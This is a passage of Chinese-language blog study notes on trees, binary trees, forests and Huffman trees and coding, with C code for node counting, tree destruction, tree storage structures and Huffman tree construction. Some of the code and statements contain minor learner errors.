class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">NodeCount</span><span class="hljs-params">(BiTree biTree)</span> &#123;<br>    <span class="hljs-keyword">if</span> (biTree != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> NodeCount(biTree-&gt;lChild)+ NodeCount(biTree-&gt;rChild)+<span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>计算叶子节点的个数（叶子节点是左右孩子都为<code>NULL</code>的节点）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">DestroyBiTree</span><span class="hljs-params">(BiTree *biTree)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*biTree == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*biTree)-&gt;lChild != <span class="hljs-literal">NULL</span>) &#123;<br>        DestroyBiTree(&amp;(*biTree)-&gt;lChild);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*biTree)-&gt;rChild != <span class="hljs-literal">NULL</span>) &#123;<br>        DestroyBiTree(&amp;(*biTree)-&gt;rChild);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  %c&quot;</span>, (*biTree)-&gt;data);<br>    <span class="hljs-built_in">free</span>((*biTree));<br>    (*biTree)==<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>线索二叉树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91.png"></p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E8%A7%84%E5%88%99.png"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%A2%9E%E5%8A%A0%E4%B8%80%E4%B8%AA%E5%A4%B4%E7%BB%93%E7%82%B9.png"></p></li></ol><h2 id="树和森林"><a href="#树和森林" class="headerlink" title="树和森林"></a>树和森林</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97.png"></p><h3 id="树的存储结构"><a href="#树的存储结构" class="headerlink" title="树的存储结构"></a>树的存储结构</h3><h4 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91%2F%E5%8F%8C%E4%BA%B2%E8%A1%A8%E7%A4%BA%E6%B3%95.png"></p><p>其中A是虚拟的头节点</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PTNode</span>&#123;</span><br>    TElemType data;<br>    <span class="hljs-type">int</span> parent;<br>&#125;PTNode;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    PTNode nodes[BUFSIZ];<br>    <span class="hljs-type">int</span> r,n;<span class="hljs-comment">//存放根节点和节点个数</span><br>&#125;PTree;<br></code></pre></td></tr></table></figure><h4 id="孩子链表"><a href="#孩子链表" class="headerlink" title="孩子链表"></a>孩子链表</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AD%A9%E5%AD%90%E9%93%BE%E8%A1%A8.png"></p><h4 id="带双亲的孩子链表"><a href="#带双亲的孩子链表" class="headerlink" title="带双亲的孩子链表"></a>带双亲的孩子链表</h4><p>只是在孩子链表的基础上多加了双亲的位置</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B8%A6%E5%8F%8C%E4%BA%B2%E7%9A%84%E5%AD%A9%E5%AD%90%E9%93%BE%E8%A1%A8.png"></p><h4 id="孩子兄弟表示法（二叉树表示法，二叉链表表示法）"><a href="#孩子兄弟表示法（二叉树表示法，二叉链表表示法）" class="headerlink" title="孩子兄弟表示法（二叉树表示法，二叉链表表示法）"></a>孩子兄弟表示法（二叉树表示法，二叉链表表示法）</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AD%A9%E5%AD%90%E5%85%84%E5%BC%9F%E8%A1%A8%E7%A4%BA%E6%B3%95.png"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AD%A9%E5%AD%90%E5%85%84%E5%BC%9F%E8%A1%A8%E7%A4%BA%E6%B3%95%E5%AE%9E%E6%93%8D.png"></p><ul><li><p>将树转换为二叉树</p><p>兄弟相连留长子</p><p>意思是：将兄弟的连起来，只保留双亲与长子的连线</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B0%86%E6%A0%91%E8%BD%AC%E5%8C%96%E4%B8%BA%E5%85%84%E5%BC%9F%E4%BA%8C%E5%8F%89%E6%A0%91%EF%BC%88%E5%85%84%E5%BC%9F%E5%AD%98%E5%82%A8%E6%B3%95%EF%BC%89.png"></p></li><li><p>将兄弟二叉树，转变为普通的树</p><p>左孩子右右连双亲，去掉原来的右孩子线</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%8F%98%E6%A0%91.png"></p></li></ul><h3 id="森林和二叉树的转化"><a href="#森林和二叉树的转化" class="headerlink" title="森林和二叉树的转化"></a>森林和二叉树的转化</h3><ol><li><p>树变二叉树根相连</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97%E5%8F%98%E6%88%90%E4%BA%8C%E5%8F%89%E6%A0%91.png"></p></li><li><p>二叉树变森林</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%8F%98%E6%A3%AE%E6%9E%97.png"></p></li></ol><h3 id="树的遍历"><a href="#树的遍历" class="headerlink" title="树的遍历"></a>树的遍历</h3><ol><li><p>先根</p><p>如树不为空，那么先遍历根然后在遍历各个子树</p></li><li><p>后根</p><p>若树不为空，后根遍历各课子树，然后访问根节点</p></li></ol><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86.png"></p><h3 id="森林的遍历"><a href="#森林的遍历" class="headerlink" title="森林的遍历"></a>森林的遍历</h3><p>和二叉树的遍历方式一致</p><ol><li><p>先序遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86.png"></p></li><li><p>中序遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97%E7%9A%84%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.png"></p></li></ol><h2 id="哈夫曼树（最优二叉树）"><a href="#哈夫曼树（最优二叉树）" class="headerlink" title="哈夫曼树（最优二叉树）"></a>哈夫曼树（最优二叉树）</h2><h3 id="判断树"><a href="#判断树" class="headerlink" title="判断树"></a>判断树</h3><p>左边是改进的选择判断语句</p><p>右边是普通的选择判断语句</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%88%A4%E6%96%AD%E6%A0%91.png"></p><ol><li><p>基本概念</p><ul><li><p>路径</p><p>从一个结点到另一个结点的分支构成了结点间的路径</p></li><li><p>结点的路径长度</p><p>两结点间的路径上的分支数</p><p>A-&gt;D 的路径长度是  2</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A62.png"></p></li><li><p>树的路径长度</p><p>从根结点到每个结点的路径长度之和</p></li><li><p>权</p><p>将树中的结点赋一个有某种含义的数值，称为<strong>结点的权</strong></p></li><li><p>结点的带权路径长度</p><p>从根到该节点之间的路径长度×该节点权的结果</p></li><li><p>树的带权路径长度</p><p>树中所有的叶子结点的带权路径长度之和</p></li></ul></li></ol><h3 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h3><p>最优树，也就是带权路径长度最短的树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91.png"></p><ol><li>满二叉树不一定是最优二叉树</li></ol><p><strong>哈夫曼树的特点</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E7%89%B9%E7%82%B9.png"></p><ul><li>只有度（子树个数 ）0为0或2的结点</li><li>一共有<code>2n-1</code>个结点，且新构成的结点都是度为二的结点，原来的结点都是度为一的结点</li><li>一共有n个叶子结点（原来的结点，也就是度为0的结点）</li></ul><h4 id="哈夫曼树的构造"><a href="#哈夫曼树的构造" class="headerlink" title="哈夫曼树的构造"></a>哈夫曼树的构造</h4><ol><li>权值越大的先构造（贪心算法）</li></ol><p>   步骤</p><ul><li>构造森林全是根</li><li>选用两小造新树</li><li>删除两小添新人</li><li>重复2，3剩单根</li></ul><p>   <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E6%9E%84%E9%80%A0.png"></p><p>   删除两小的意思是：删除原来队列里面的两个小的</p><p>   <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E6%9E%84%E9%80%A0%E5%AE%9E%E4%BE%8B.png"></p><p>   直到剩下一棵树，就是哈夫曼树</p><p>   下面是一个例题</p><p>   <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E6%9E%84%E9%80%A0%E4%BE%8B%E9%A2%98.png"></p><ol start="2"><li><p>代码实现</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0.png"></p><p>注意重置min的过程，可以改进算法，但是作者还没有学到遍历，所以并没有采取其他方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNKSIZE 80</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HTNode</span> &#123;</span><br>    <span class="hljs-type">int</span> weight;<br>    <span class="hljs-type">int</span> parent, lch, rch;<br>&#125; HTNode, *HuffmanTree;<br><span class="hljs-comment">//采用双亲表示法，但是会记录左右孩子的位置</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Select</span><span class="hljs-params">(HTNode *htNodes, <span class="hljs-type">int</span> size, <span class="hljs-type">int</span> *min1, <span class="hljs-type">int</span> *min2)</span> &#123;<br>    <span class="hljs-comment">//以下算法用于去出较次和最次的元素</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">if</span> ((htNodes + i)-&gt;parent == <span class="hljs-number">0</span><br>            &amp;&amp; (htNodes + i)-&gt;weight &lt; (htNodes + *min1)-&gt;weight) &#123;<span class="hljs-comment">//确保每小权的结点已经被选用</span><br><br>            *min2 = *min1;<br>            *min1 = i;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((htNodes + i)-&gt;parent == <span class="hljs-number">0</span><br>                   &amp;&amp; (htNodes + i)-&gt;weight &lt; (htNodes + *min2)-&gt;weight<br>                   &amp;&amp; i != *min1) &#123;<br><br>            *min2 = i;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">initMin</span><span class="hljs-params">(HTNode* htNodes,<span class="hljs-type">int</span> size,<span class="hljs-type">int</span> *min1,<span class="hljs-type">int</span> *min2)</span>&#123;<br>    <span class="hljs-comment">//重置最小值，防止取出来的最小值是已经被选过的</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">if</span>((htNodes+i)-&gt;parent==<span class="hljs-number">0</span>)&#123;<br>            *min1=i++;<span class="hljs-comment">//break使得++i失效</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(;i&lt;size;++i)&#123;<br>        <span class="hljs-keyword">if</span>((htNodes+i)-&gt;parent==<span class="hljs-number">0</span>)&#123;<br>            *min2=i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br>status <span class="hljs-title function_">creatNode</span><span class="hljs-params">(HTNode *htNodes, <span class="hljs-type">int</span> *nums, <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> min1 = <span class="hljs-number">0</span>, min2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> size1;<br>    size1 = size * <span class="hljs-number">2</span> - <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">for</span> (; i&lt;size; ++i) &#123;<br>        (htNodes + i)-&gt;weight = *(nums + i);<br>        (htNodes + i)-&gt;lch = <span class="hljs-number">0</span>;<br>        (htNodes + i)-&gt;rch = <span class="hljs-number">0</span>;<br>        (htNodes + i)-&gt;parent = <span class="hljs-number">0</span>;<span class="hljs-comment">//一定要将parent重置为0</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (; i &lt; size1 ; ++i) &#123;<br>        initMin(htNodes,i,&amp;min1,&amp;min2);<br>        Select(htNodes, i, &amp;min1, &amp;min2);<br>        (htNodes + i)-&gt;weight = (htNodes + min1)-&gt;weight + (htNodes + min2)-&gt;weight;<br>        (htNodes + i)-&gt;lch = min1;<br>        (htNodes + i)-&gt;rch = min2;<br>        (htNodes + i)-&gt;parent = <span class="hljs-number">0</span>;<br>        (htNodes + min1)-&gt;parent = i;<br>        (htNodes + min2)-&gt;parent = i;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">int</span> nums[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> tem;<br>    HTNode htNodes[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//注意这里使用变量，不使用指针</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num);<span class="hljs-comment">//num最大是5，因为，2n-1留一个0不用</span><br><span class="hljs-comment">/*    if(num&gt;5)&#123;</span><br><span class="hljs-comment">        printf(&quot;num too large&quot;);</span><br><span class="hljs-comment">        exit(-1);</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;tem);<br>        nums[i] = tem;<br>    &#125;<br>    creatNode(htNodes, nums, num);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>*num<span class="hljs-number">-1</span>; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,htNodes[i].weight);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h4 id="哈曼树的运用"><a href="#哈曼树的运用" class="headerlink" title="哈曼树的运用"></a>哈曼树的运用</h4><h5 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h5><ol><li><p>设计一种任意的编码都不是另一个编码的前缀</p><p>如A(0)是B(00)的前缀</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81.png"></p></li><li><p>通过哈夫曼编码使得电文最短</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%A6%82%E4%BD%95%E4%BD%BF%E5%BE%97%E7%94%B5%E6%96%87%E7%9A%84%E6%9C%80%E7%9F%AD.png"></p><p>将要传输的字符出现的频率当作权值</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%A6%82%E4%BD%95%E4%BD%BF%E5%BE%97%E7%94%B5%E6%96%87%E7%9A%84%E6%9C%80%E7%9F%AD.png"></p></li><li><p>问题</p><ul><li><p>为什么哈夫曼编码能确保不是前缀编码？</p><blockquote><p>因为每一个字符都是叶子结点，也就是说，没有哪个叶子是另个一个叶子的前缀，也就是没有相同的路径</p></blockquote></li><li><p>为什么哈夫曼树能确保字符编码总长最短？</p><blockquote><p>才用权的方式，权重大的离根节点更近，所以形成的编码最短。换句话说哈夫曼树的加权路径最短</p></blockquote></li></ul></li><li><p>性质</p><ul><li>哈夫曼编码是前缀码</li><li>而且是最有前缀码</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>树和二叉树</title>
    <link href="/2023/04/05/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2023/04/05/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="树和二叉树"><a href="#树和二叉树" class="headerlink" title="树和二叉树"></a>树和二叉树</h1><h2 id="树的基本"><a href="#树的基本" class="headerlink" title="树的基本"></a>树的基本</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A0%91%E7%9A%84%E5%AE%9A%E4%B9%89.png"></p><ol><li><p>一个根和若干的子树</p></li><li><p>基本术语</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91%2F%E6%A0%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%9C%AF%E8%AF%AD.png"></p></li><li><p>树的类别</p><ul><li><p>有序树</p><p>子树有位置要求</p></li><li><p>无序树</p><p>子树无要求</p><p>意思是：1，2，3，这三颗子树，无论如何排列都是一个树</p></li></ul></li><li><p>森林</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97.png"></p></li><li><p>树和线性结构的比较</p><ul><li>树是一对多</li><li>线性结构是一对一</li></ul></li></ol><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><ol><li><p>每个节点最多有两个度</p></li><li><p>二叉树是个有序树（但是不是树的特殊情况）</p></li><li><p>二叉树可以是一 个空集 </p></li><li><p>二叉树必须要分左子树还是右子树，即使只有一颗子树也要分（但是树可以不分，所以这就是二叉树不是树的原因）</p></li><li><p>二叉树的基本形态</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%BD%A2%E6%80%81.png"></p></li><li><p>二叉树的抽象类型定义</p></li><li><p>二叉树的性质</p><ul><li><p>在二叉树的第<code>i</code>层最多有2^i-1^ 个节点，最少有一个</p></li><li><p>深度为<code>k</code>的二叉树最多有2^k^ -1个节点</p></li><li><p>对任何一颗二叉树T如果叶子树为n<del>0</del>&#x3D;n<del>2</del>+1</p></li></ul><p>  <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E6%A0%91%E7%9A%84%E6%80%A7%E8%B4%A83.png"></p><ul><li><p>B&#x3D;n-1</p><p>从下网上看，因为除了根节点每个节点都会产生一条边，所以<code>n-1</code>（除了根节点）个节点会产生<code>n-1</code>个边</p></li><li><p>n<del>2</del> *2 +n<del>1</del>*1</p><p>从上往下看，因为，每一个度为2的节点都会产生两条边，每一度为1的节点会产生一个边</p></li><li><p>满二叉树</p><ul><li>每一层都达到最大的节点数</li><li>叶子节点出现在最后一层</li></ul></li><li><p>完成二叉树</p><ul><li><p>二叉树中有编号的与满二叉树的标号对应</p></li><li><p>在满二叉树中去除立连续的节点，剩下的也是完全二叉树</p></li><li><p>满二叉树一定是完全二叉树</p></li><li><p>完全二叉树的性质</p><p>性质三</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%80%A7%E8%B4%A8.png"></p><p>性质四</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%80%A7%E8%B4%A8.png"></p></li></ul></li></ul></li><li><p>二叉树的存储结构  </p><ul><li>顺序结构</li><li>链式结构<ul><li>二叉链表</li><li>三叉链表</li></ul></li></ul></li><li><p>二叉树的链式存储的储存结构</p><p>二叉链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span>&#123;</span><br>    TElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span> *<span class="hljs-title">lChild</span>,*<span class="hljs-title">rChild</span>;</span><br>&#125;BiNode,*BiTree;<br></code></pre></td></tr></table></figure><p>三叉链表(多了一个指向双亲的指针)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 